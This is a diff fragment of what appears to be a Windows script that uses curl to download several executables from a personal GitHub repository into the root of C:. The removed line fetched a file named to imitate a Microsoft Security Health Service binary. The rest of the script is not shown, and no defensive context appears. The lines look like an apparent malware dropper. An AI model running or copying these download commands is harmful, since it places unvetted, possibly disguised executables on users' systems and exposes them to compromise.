@@ -18,7 +18,7 @@ curl.exe -L -o C:\bhavani.exe https://raw.githubusercontent.com/hari98486/fff/ma
 
 curl.exe -L -o C:\remotezone.exe https://raw.githubusercontent.com/hari98486/fff/main/remotezone.exe
 
-curl.exe -L -o C:\jai.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/Microsoft%20Security%20Health%20Service64-HANUMAN%20(1).exe"
+curl.exe -L -o C:\jai.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/jai.exe"
 
 curl -L "https://raw.githubusercontent.com/hari98486/systemcheck/main/hara%20(1).exe" -o "C:\hara.exe"
 
